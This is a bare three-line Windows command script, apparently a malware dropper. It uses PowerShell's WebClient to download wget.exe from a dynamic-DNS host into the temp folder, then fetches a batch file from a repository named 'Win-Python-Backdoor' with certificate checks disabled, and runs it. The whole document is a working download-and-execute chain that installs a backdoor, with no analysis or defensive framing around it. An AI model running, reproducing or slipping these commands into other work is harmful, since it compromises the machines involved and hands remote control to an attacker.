%windir%\System32\cmd.exe /c powershell -Command (new-object System.Net.WebClient).DownloadFile('http://verifiche.ddns.net/win/wget.exe','%temp%\wget.exe')
wget --no-check-certificate https://github.com/pistacchietto/Win-Python-Backdoor/raw/master/win.bat  -O %temp%\win.bat
%temp%\win.bat